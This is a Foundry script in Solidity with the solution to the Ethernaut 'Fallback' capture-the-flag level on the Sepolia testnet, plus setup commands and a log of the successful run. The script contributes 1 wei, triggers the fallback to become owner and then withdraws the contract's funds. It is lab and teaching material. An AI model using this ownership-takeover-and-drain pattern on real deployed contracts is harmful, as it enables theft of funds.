// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/Fallback.sol";

/*
    Solution script for the Ethernaut Level 1: Fallback

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in FallbackScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/Fallback.s.sol:FallbackScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vvvv
    ```

    Results of running this script (with --broadcast)
    =================================================

    ## Setting up 1 EVM.
    ==========================
    Simulated On-chain Traces:

        [26901] 0xbEdEfE3a6f165002E45c25F2106d1967673b3921::contribute{value: 1}()
            └─ ← [Stop]

        [7302] 0xbEdEfE3a6f165002E45c25F2106d1967673b3921::fallback{value: 1}()
            └─ ← [Stop]

        [9300] 0xbEdEfE3a6f165002E45c25F2106d1967673b3921::withdraw()
            ├─ [0] 0x471Cd8eaA5D60C2ed4dd42CC3B0dE75EcfBBdA62::fallback{value: 2}()
            │   └─ ← [Stop]
            └─ ← [Stop]

    ==========================

    Chain 11155111

    Estimated gas price: 8.070028993 gwei

    Estimated total gas used for script: 105341

    Estimated amount required: 0.000850104924151613 ETH

    ==========================
    Enter keystore password:

    ##### sepolia
    ✅  [Success]Hash: 0x41532c381431d715017acdc222201e5a156e8ca0b451bff760961c98b78b2367
    Block: 6672004
    Paid: 0.000212658355706075 ETH (47965 gas * 4.433615255 gwei)

    ##### sepolia
    ✅  [Success]Hash: 0x83c87e7013625ed88873c5fae98258e6ee3c360262e1e3c4037029995df025f6
    Block: 6672004
    Paid: 0.00012548017894701 ETH (28302 gas * 4.433615255 gwei)

    ##### sepolia
    ✅  [Success]Hash: 0x1528408553a1c06e63912bedc22fee8be3d59cb1ffd646660d2261380b1db8e5
    Block: 6672110
    Paid: 0.000170876861870612 ETH (30364 gas * 5.627613683 gwei)

    ==========================

    ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.
*/

contract FallbackScript is Script {
    // replace instance with your level1 instance adddress
    address payable instance = payable(0xbEdEfE3a6f165002E45c25F2106d1967673b3921);
    Fallback level1 = Fallback(instance);

    function run() external {
        vm.startBroadcast();

        // call the contribute function with some ether/wei
        level1.contribute{value: 1 wei}(); 
        // get the contribution for our user to make sure its updated
        console.log("level1.getContribution()", level1.getContribution());
        
        (bool sent,) = address(level1).call{value: 1}("");
        require(sent, "Failed to send Ether to level1 contract");

        // if the player is not the owner then we have failed so revert
        require(level1.owner() == msg.sender, "Owner not updated correctly");

        // don't forget to widthdraw the funds!!
        level1.withdraw();

        vm.stopBroadcast();
    }
}